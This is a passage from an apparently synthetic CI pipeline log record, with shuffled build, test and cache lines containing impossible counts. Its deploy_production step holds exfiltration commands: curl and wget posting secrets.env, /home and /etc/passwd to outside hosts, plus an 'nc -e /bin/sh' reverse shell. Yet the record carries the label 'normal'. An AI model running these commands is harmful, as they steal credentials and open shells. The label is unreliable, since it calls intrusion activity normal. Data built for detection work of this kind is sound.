          "Step 6/21: Testing",
          "Minifying app.js",
          "Step 18/19: Linting",
          "npm install: resolved 1352 packages",
          "Step 17/16: Deploying",
          "[12:19:37] WARN: Deprecated API usage",
          "pip: Downloading webpack-5.17.tar.gz",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "[12:19:37] DEBUG: Connection pool: 11 active",
          "Waiting...",
          "Time: 51.928s",
          "\u2717 build failed with exit code 20",
          "npm notice: package.json updated",
          "Ready.",
          "Using Node.js 17.9.6",
          "Compiling utils/main.py...",
          "Transforming 310 files...",
          "npm notice: created a lockfile",
          "[12:19:37] INFO: Request completed",
          "[12:19:37] INFO: Request completed",
          "Compiling utils/app.ts...",
          "Test Suites: 11 passed, 30 total",
          "[12:19:37] ERROR: Connection failed",
          "Cache invalidated: build",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-03T12:21:50.422508",
        "finished_at": "2025-12-03T12:21:58.884727",
        "log_lines": [
          "=== Step: save_cache ===",
          "  PASS: test_db_connect (477ms)",
          "Layer 1/13: RUN command",
          "Ready.",
          "npm notice: package.json updated",
          "POST /upload - 201 (318ms)",
          "Snapshots: 1 passed, 25 total",
          "Step 6/23: Testing",
          "[12:19:37] DEBUG: Connection pool: 19 active",
          "Uploading artifact 'build' (16 files)",
          "\u2713 Task completed in 2378ms",
          "Success!",
          "POST /api - 202 (181ms)",
          "Uploading artifact 'build' (39 files)",
          "HEAD is now at 9d76c8a",
          "Cache restored successfully (124MB)",
          "[12:19:37] ERROR: Connection failed",
          "pip: Downloading jest-2.7.tar.gz",
          "[12:19:37] ERROR: Connection failed",
          "Optimizing 78 modules...",
          "Uploading artifact 'coverage' (22 files)",
          "[12:19:37] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Waiting...",
          "[12:19:37] WARN: Deprecated API usage",
          "Compiling utils/main.py...",
          "Test Suites: 20 passed, 38 total",
          "Platform: win32-x64",
          "Artifact uploaded: dist.zip (36MB)",
          "[12:19:37] INFO: Cache refreshed",
          "\u2713 Task completed in 1020ms",
          "pip: Downloading prettier-1.1.tar.gz",
          "[12:19:37] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-296'",
          "\u2713 Task completed in 3083ms",
          "Environment: test",
          "Waiting...",
          "NODE_ENV=development",
          "Coverage: 87% statements, 85% branches",
          "[12:19:37] WARN: Deprecated API usage",
          "Verifying...",
          "Optimizing 62 modules...",
          "Coverage: 87% statements, 69% branches",
          "Using Node.js 19.6.2",
          "Installing lodash@3.3.10",
          "\u2713 Step 'test' succeeded",
          "TLS handshake completed",
          "[12:19:37] INFO: Starting build process",
          "Step 4/21: Running migrations",
          "[12:19:37] DEBUG: Memory usage: 1575MB",
          "Coverage: 89% statements, 78% branches",
          "Coverage: 75% statements, 84% branches",
          "[12:19:37] WARN: Deprecated API usage",
          "Compiling lib/index.js...",
          "Step 2/16: Deploying",
          "Using Node.js 19.7.8",
          "pip install: Successfully installed axios-4.3",
          "Step 10/16: Running migrations",
          "Step 8/21: Running migrations",
          "Minifying app.js",
          "Step 13/17: Deploying",
          "TLS handshake completed",
          "  PASS: test_cache_hit (72ms)",
          "Compiling lib/handler.rs...",
          "npm install: added 415 packages",
          "Loading...",
          "Exception: TypeError",
          "Image pulled successfully",
          "Loading...",
          "Environment: test",
          "POST /api - 202 (386ms)",
          "Minifying vendor.js",
          "POST /api - 200 (208ms)",
          "[12:19:37] DEBUG: Loading configuration",
          "WARNING: jest has known vulnerabilities",
          "Cache restored successfully (53MB)",
          "Step 13/17: Installing dependencies",
          "Using Python 3.10",
          "Compiling lib/handler.rs...",
          "Using Node.js 15.10.10",
          "Finished.",
          "Using Node.js 17.7.4",
          "[12:19:37] WARN: Deprecated API usage",
          "POST /api - 202 (202ms)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Cache miss for key-2610",
          "Snapshots: 37 passed, 15 total",
          "Verifying...",
          "\u2713 Step 'build' succeeded",
          "Compiling utils/utils.go...",
          "Image pulled successfully",
          "Exception: TypeError",
          "[12:19:37] DEBUG: Memory usage: 381MB",
          "Completed.",
          "Processing...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-03T12:21:58.884727",
        "finished_at": "2025-12-03T12:22:12.988425",
        "log_lines": [
          "=== Step: lint ===",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "Switched to branch 'feature/task-301'",
          "Platform: linux-x64",
          "Switched to branch 'feature/task-500'",
          "Waiting...",
          "Minifying vendor.js",
          "Step 5/21: Linting",
          "Time: 66.671s",
          "GET /status - 200 (10ms)",
          "[12:19:37] WARN: Deprecated API usage",
          "Test Suites: 29 passed, 28 total",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache restored successfully (194MB)",
          "pip install: Successfully installed webpack-3.1",
          "Cache hit for key-3910",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: linux-x64",
          "Step 18/22: Building",
          "WARNING: axios has known vulnerabilities",
          "  PASS: e2e/test_auth_login.spec.js",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 20/17: Testing",
          "Connecting to test.io:443...",
          "pip: Downloading webpack-2.20.tar.gz",
          "Artifact uploaded: dist.zip (56MB)",
          "Artifact downloaded: 22MB",
          "[12:19:37] INFO: Cache refreshed",
          "Step 10/24: Testing",
          "[12:19:37] DEBUG: Memory usage: 1497MB",
          "pip: Installing build dependencies...",
          "Test Suites: 50 passed, 8 total",
          "Compiling components/utils.go...",
          "pip: Collecting eslint",
          "Finished.",
          "npm notice: created a lockfile",
          "[12:19:37] ERROR: Connection failed",
          "Step 15/21: Running migrations",
          "TLS handshake completed",
          "Verifying...",
          "Test Suites: 33 passed, 27 total",
          "Pushing to registry...",
          "Waiting...",
          "WARNING: axios has known vulnerabilities",
          "Success!",
          "[12:19:37] DEBUG: Initializing service",
          "Cache saved successfully",
          "  PASS: unit/test_db_connect.spec.js",
          "Step 16/24: Running migrations",
          "Step 1/18: Testing",
          "Step 10/22: Testing",
          "Pushing to registry...",
          "Artifact downloaded: 44MB",
          "[12:19:37] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Compiling utils/handler.rs...",
          "pip: Collecting express",
          "npm notice: created a lockfile",
          "Ready.",
          "NODE_ENV=development",
          "HEAD is now at a713200",
          "[12:19:37] DEBUG: Memory usage: 1226MB",
          "Step 10/25: Running migrations",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 Step 'install' succeeded",
          "Verifying...",
          "Cache restored successfully (361MB)",
          "GET /status - 200 (9ms)",
          "Step 13/16: Building",
          "[12:19:37] INFO: Processing request",
          "Verifying...",
          "yarn add: Done in 7.64s",
          "Time: 17.552s",
          "Finished.",
          "Platform: darwin-arm64",
          "Installing webpack@1.1.7",
          "[12:19:37] INFO: Processing request",
          "Success!",
          "Cache hit for key-7982",
          "Building Docker image...",
          "Minifying app.js",
          "  PASS: integration/test_api_health.spec.js",
          "Artifact uploaded: dist.zip (86MB)",
          "Building Docker image...",
          "[12:19:37] INFO: Cache refreshed",
          "Time: 64.261s",
          "Installing jest@3.2.10",
          "Artifact uploaded: build.tar.gz (23MB)",
          "POST /api - 202 (75ms)",
          "npm install: resolved 360 packages",
          "Verifying...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-03T12:22:12.988425",
        "finished_at": "2025-12-03T12:22:27.092123",
        "log_lines": [
          "=== Step: type_check ===",
          "Processing...",
          "Cache saved successfully",
          "Waiting...",
          "[12:19:37] INFO: Cache refreshed",
          "npm install: resolved 223 packages",
          "[12:19:37] DEBUG: Loading configuration",
          "[12:19:37] INFO: Cache refreshed",
          "Generating source maps...",
          "Exception: RuntimeError",
          "\u2713 Step 'setup' succeeded",
          "Cache restored successfully (39MB)",
          "npm notice: package.json updated",
          "[12:19:37] DEBUG: Loading configuration",
          "Cache hit for key-3419",
          "[12:19:37] INFO: Request completed",
          "Verifying...",
          "Processing...",
          "Ran 38 tests in 30s",
          "Done.",
          "Switched to branch 'bugfix/task-888'",
          "Creating production build...",
          "Connecting to example.com:443...",
          "Step 17/24: Building",
          "Transforming 497 files...",
          "Minifying vendor.js",
          "Step 18/15: Installing dependencies",
          "Cache hit for key-3343",
          "Transforming 238 files...",
          "pip: Downloading lodash-1.7.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed axios-1.20",
          "Waiting...",
          "Step 13/19: Linting",
          "npm install: added 92 packages",
          "npm install: added 451 packages",
          "Uploading artifact 'build' (19 files)",
          "Optimizing 39 modules...",
          "  PASS: unit/test_user_create.spec.js",
          "Compiling src/handler.rs...",
          "Step 5/17: Testing",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Cache hit for key-5837",
          "Uploading artifact 'dist' (39 files)",
          "HEAD is now at 55b2e00",
          "WARNING: react has known vulnerabilities",
          "Waiting...",
          "Layer 6/10: RUN command",
          "  PASS: test_cache_hit (235ms)",
          "  PASS: integration/test_user_create.spec.js",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (19MB)",
          "Snapshots: 34 passed, 34 total",
          "Platform: win32-x64",
          "\u2713 Step 'install' succeeded",
          "Cache restored successfully (235MB)",
          "Tests: 107 passed, 208 total",
          "WARNING: jest has known vulnerabilities",
          "[12:19:37] INFO: Processing request",
          "Uploading artifact 'build' (9 files)",
          "[12:19:37] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Minifying app.js",
          "Uploading artifact 'coverage' (41 files)",
          "Checking out develop branch",
          "Loading...",
          "Step 14/21: Running migrations",
          "Uploading artifact 'dist' (45 files)",
          "Checking out main branch",
          "[12:19:37] INFO: Request completed",
          "[12:19:37] INFO: Starting build process",
          "npm install: added 431 packages",
          "[12:19:37] INFO: Cache refreshed",
          "pip: Downloading prettier-5.0.tar.gz",
          "Environment: staging",
          "Connection established",
          "Processing...",
          "Ready.",
          "Cache miss for key-8387",
          "[12:19:37] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-9098",
          "[12:19:37] DEBUG: Memory usage: 150MB",
          "Compiling utils/service.java...",
          "Ready.",
          "Ready.",
          "[12:19:37] INFO: Connecting to database",
          "pip install: Successfully installed express-2.10",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:37] DEBUG: Initializing service",
          "Building Docker image...",
          "HEAD is now at 9f81eae",
          "OK",
          "Completed.",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-03T12:22:27.092123",
        "finished_at": "2025-12-03T12:22:35.554342",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Using Python 3.10",
          "\u2713 Step 'checkout' succeeded",
          "Connection established",
          "Artifact downloaded: 30MB",
          "Compiling lib/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out master branch",
          "Verifying...",
          "[12:19:37] WARN: Deprecated API usage",
          "Step 13/24: Linting",
          "Compiling lib/service.java...",
          "Ready.",
          "npm notice: created a lockfile",
          "Cache hit for key-9736",
          "WARNING: jest has known vulnerabilities",
          "Uploading artifact 'build' (26 files)",
          "Bundling runtime.css",
          "\u2713 deploy completed",
          "HEAD is now at 6f10407",
          "Compiling src/service.java...",
          "Artifact uploaded: dist.zip (96MB)",
          "Transforming 258 files...",
          "Snapshots: 3 passed, 3 total",
          "Installing react@1.3.2",
          "\u2713 build completed",
          "  PASS: unit/test_db_connect.spec.js",
          "Connecting to example.com:443...",
          "Ran 198 tests in 42s",
          "  PASS: test_user_create (417ms)",
          "Compiling utils/utils.go...",
          "yarn add: Done in 24.41s",
          "[12:19:37] WARN: Deprecated API usage",
          "npm install: added 290 packages",
          "Success!",
          "[12:19:37] DEBUG: Memory usage: 634MB",
          "Using Python 3.10",
          "npm install: resolved 185 packages",
          "[12:19:37] INFO: Processing request",
          "Bundling styles.js",
          "[12:19:37] WARN: Deprecated API usage",
          "Minifying main.js",
          "npm notice: package.json updated",
          "\u2713 Step 'checkout' succeeded",
          "Pushing to registry...",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Image pulled successfully",
          "  PASS: test_user_create (73ms)",
          "  PASS: test_user_create (129ms)",
          "pip install: Successfully installed jest-3.2",
          "Step 18/21: Testing",
          "Done.",
          "Test Suites: 24 passed, 35 total",
          "Test Suites: 31 passed, 35 total",
          "[12:19:37] INFO: Request completed",
          "Uploading artifact 'coverage' (29 files)",
          "Bundling styles.css",
          "Switched to branch 'feature/task-697'",
          "\u2713 Task completed in 3227ms",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache invalidated: dependencies",
          "Ready.",
          "[12:19:37] INFO: Connecting to database",
          "Pulling image: alpine:3.11",
          "Step 3/24: Deploying",
          "yarn add: Done in 19.92s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "Compiling lib/utils.go...",
          "\u2713 All checks passed",
          "\u2713 deploy completed",
          "\u2713 deploy completed",
          "Optimizing 61 modules...",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2717 build failed with exit code 99",
          "Minifying vendor.js",
          "Connection established",
          "Completed.",
          "Uploading artifact 'build' (27 files)",
          "\u2713 package completed",
          "Coverage: 96% statements, 99% branches",
          "Coverage: 85% statements, 95% branches",
          "Compiling src/service.java...",
          "Connection established",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Environment: staging",
          "Switched to branch 'feature/task-681'",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: TypeError",
          "Step 15/23: Building",
          "POST /upload - 201 (290ms)",
          "Completed.",
          "Snapshots: 23 passed, 1 total",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-03T12:22:35.554342",
        "finished_at": "2025-12-03T12:23:17.865435",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Building Docker image...",
          "NODE_ENV=development",
          "pip: Downloading webpack-3.4.tar.gz",
          "npm notice: package.json updated",
          "[12:19:37] INFO: Starting build process",
          "\u2713 Step 'build' succeeded",
          "Transforming 728 files...",
          "[12:19:37] INFO: Connecting to database",
          "[12:19:37] INFO: Processing request",
          "Processing...",
          "Success!",
          "Cache miss for key-9414",
          "[12:19:37] INFO: Request completed",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact downloaded: 30MB",
          "Platform: linux-x64",
          "Bundling main.js",
          "Compiling src/handler.rs...",
          "npm notice: package.json updated",
          "  PASS: test_cache_hit (368ms)",
          "Transforming 527 files...",
          "Cache miss for key-9838",
          "Artifact downloaded: 9MB",
          "npm notice: package.json updated",
          "yarn add: Done in 16.19s",
          "HEAD is now at 4fd29d5",
          "[12:19:37] WARN: Deprecated API usage",
          "Step 19/22: Running migrations",
          "Tests: 406 passed, 64 total",
          "pip: Collecting prettier",
          "GET /health - 201 (50ms)",
          "Step 19/15: Testing",
          "Step 15/23: Deploying",
          "Image pulled successfully",
          "Pushing to registry...",
          "Compiling components/utils.go...",
          "NODE_ENV=production",
          "Ready.",
          "pip: Collecting prettier",
          "Time: 90.121s",
          "GET /api - 200 (48ms)",
          "WARNING: axios has known vulnerabilities",
          "Waiting...",
          "Success!",
          "Test Suites: 16 passed, 8 total",
          "Pushing to registry...",
          "Verifying...",
          "Compiling lib/index.js...",
          "FAILED: test_db_connect",
          "WARNING: react has known vulnerabilities",
          "Success!",
          "HEAD is now at 18a92ac",
          "Ran 56 tests in 35s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: dist.zip (84MB)",
          "Compiling components/utils.go...",
          "npm notice: created a lockfile",
          "Connection established",
          "pip install: Successfully installed react-1.19",
          "Step 10/17: Linting",
          "Test Suites: 31 passed, 13 total",
          "\u2713 Task completed in 4850ms",
          "Checking out develop branch",
          "Ready.",
          "Image pulled successfully",
          "Cache saved successfully",
          "  PASS: test_user_create (484ms)",
          "HEAD is now at 2eae50a",
          "Step 10/19: Running migrations",
          "npm notice: package.json updated",
          "\u2713 validate completed",
          "NODE_ENV=development",
          "Compiling lib/index.js...",
          "pip: Downloading react-1.10.tar.gz",
          "NODE_ENV=development",
          "Installing prettier@3.19.10",
          "[12:19:37] WARN: Deprecated API usage",
          "[12:19:37] INFO: Request completed",
          "yarn add: Done in 22.85s",
          "pip: Collecting eslint",
          "npm notice: created a lockfile",
          "Platform: darwin-arm64",
          "Tests: 381 passed, 189 total",
          "Compiling src/service.java...",
          "pip: Installing build dependencies...",
          "[12:19:37] DEBUG: Connection pool: 7 active",
          "Processing...",
          "Optimizing 63 modules...",
          "Ready.",
          "Checking out develop branch",
          "Success!",
          "Minifying app.js",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-03T12:23:17.865435",
        "finished_at": "2025-12-03T12:23:31.969133",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Cache saved successfully",
          "Step 12/22: Installing dependencies",
          "Pushing to registry...",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Uploading artifact 'dist' (46 files)",
          "Step 20/18: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "WARNING: prettier has known vulnerabilities",
          "Step 4/18: Installing dependencies",
          "WARNING: prettier has known vulnerabilities",
          "Compiling lib/app.ts...",
          "Tests: 98 passed, 152 total",
          "Connecting to acme.corp:443...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Checking out develop branch",
          "Checking out master branch",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'test' succeeded",
          "[12:19:37] INFO: Starting build process",
          "[12:19:37] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Success!",
          "Step 18/16: Installing dependencies",
          "Artifact uploaded: dist.zip (19MB)",
          "Finished.",
          "Processing...",
          "[12:19:37] WARN: Deprecated API usage",
          "Using Node.js 14.8.6",
          "Verifying...",
          "Cache invalidated: node_modules",
          "Cache restored successfully (40MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "Artifact downloaded: 33MB",
          "Step 15/16: Running migrations",
          "Verifying...",
          "Step 4/15: Installing dependencies",
          "Using Python 3.9",
          "Pulling image: node:latest",
          "Compiling components/index.js...",
          "Step 7/23: Linting",
          "[12:19:37] ERROR: Connection failed",
          "pip: Downloading prettier-3.8.tar.gz",
          "Step 4/22: Running migrations",
          "Compiling lib/service.java...",
          "POST /api - 200 (32ms)",
          "WARNING: lodash has known vulnerabilities",
          "Platform: darwin-arm64",
          "HEAD is now at 09ba577",
          "pip: Installing build dependencies...",
          "[12:19:37] ERROR: Connection failed",
          "Step 11/21: Running migrations",
          "pip: Installing build dependencies...",
          "Compiling utils/main.py...",
          "Step 1/23: Building",
          "Artifact downloaded: 31MB",
          "Checking out develop branch",
          "Ready.",
          "Cache hit for key-7236",
          "Compiling lib/utils.go...",
          "[12:19:37] WARN: Deprecated API usage",
          "Step 16/18: Building",
          "pip: Downloading react-2.9.tar.gz",
          "Cache restored successfully (240MB)",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "yarn add: Done in 30.11s",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:37] INFO: Processing request",
          "  PASS: e2e/test_api_health.spec.js",
          "Already up to date.",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "POST /data - 200 (318ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out develop branch",
          "Verifying...",
          "Loading...",
          "Step 6/25: Running migrations",
          "[12:19:37] INFO: Starting build process",
          "Loading...",
          "Step 8/22: Linting",
          "npm install: resolved 1865 packages",
          "Connection established",
          "Transforming 335 files...",
          "Using Node.js 20.8.6",
          "Pushing to registry...",
          "Uploading artifact 'build' (27 files)",
          "npm install: resolved 520 packages",
          "[12:19:37] WARN: Deprecated API usage",
          "[12:19:37] DEBUG: Memory usage: 1098MB",
          "[12:19:37] DEBUG: Initializing service",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-03T12:23:31.969133",
        "finished_at": "2025-12-03T12:23:37.610612",
        "log_lines": [
          "=== Step: deploy_production ===",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "\u2713 test completed",
          "\u2717 build failed with exit code 46",
          "Installing axios@3.18.3",
          "OK",
          "[12:19:37] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "[12:19:37] DEBUG: Memory usage: 1919MB",
          "Ran 157 tests in 16s",
          "pip: Installing build dependencies...",
          "[12:19:37] INFO: Cache refreshed",
          "Using Python 3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 9/22: Installing dependencies",
          "[12:19:37] WARN: Deprecated API usage",
          "OK",
          "Cache miss for key-2325",
          "Minifying vendor.js",
          "Step 9/16: Installing dependencies",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "WARNING: react has known vulnerabilities",
          "\u2713 test completed",
          "Artifact downloaded: 31MB",
          "Cache miss for key-2488",
          "GET /health - 200 (16ms)",
          "[12:19:37] INFO: Connecting to database",
          "Minifying vendor.js",
          "Connecting to acme.corp:443...",
          "[12:19:37] DEBUG: Initializing service",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "NODE_ENV=test",
          "Fetching submodules...",
          "Completed.",
          "Using Node.js 18.11.9",
          "Bundling main.js",
          "npm install: added 266 packages",
          "Compiling utils/handler.rs...",
          "Already up to date.",
          "Minifying app.js",
          "Step 11/18: Testing",
          "npm install: added 424 packages",
          "Checking out master branch",
          "[12:19:37] INFO: Starting build process",
          "Completed.",
          "Minifying app.js",
          "[12:19:37] INFO: Processing request",
          "Success!",
          "NODE_ENV=test",
          "Bundling main.js",
          "Loading...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Ran 133 tests in 19s",
          "Step 15/15: Linting",
          "Using Node.js 15.5.0",
          "Switched to branch 'feature/task-966'",
          "\u2713 build completed",
          "Generating source maps...",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:19:37] WARN: Deprecated API usage",
          "Test Suites: 7 passed, 39 total",
          "Coverage: 80% statements, 93% branches",
          "  PASS: test_db_connect (141ms)",
          "Compiling src/handler.rs...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Optimizing 28 modules...",
          "npm notice: package.json updated",
          "[12:19:37] DEBUG: Loading configuration",
          "Environment: production",
          "npm notice: package.json updated",
          "Cache miss for key-9429",
          "Step 14/22: Installing dependencies",
          "[12:19:37] DEBUG: Query executed in 95ms",
          "FAILED: test_user_create",
          "npm notice: created a lockfile",
          "Loading...",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "[12:19:37] DEBUG: Query executed in 50ms",
          "[12:19:37] DEBUG: Query executed in 25ms",
          "\u2713 Step 'test' succeeded",
          "  PASS: test_cache_hit (346ms)",
          "nc -e /bin/sh 220.179.91.40 39085",
          "Step 17/19: Linting",
          "Uploading artifact 'coverage' (29 files)",
          "Already up to date.",
          "Step 6/15: Deploying",
          "TLS handshake completed",
          "Fetching submodules...",
          "Transforming 988 files...",
          "npm install: resolved 1522 packages",
          "Compiling utils/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Cache invalidated: dependencies",
          "[12:19:37] INFO: Request completed",
          "HEAD is now at d8e6b35",
          "[12:19:37] DEBUG: Loading configuration",
          "Checking out master branch",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:37] INFO: Processing request",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:19:37] INFO: Request completed",
          "[12:19:37] DEBUG: Connection pool: 14 active",
          "\u2713 Task completed in 782ms",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}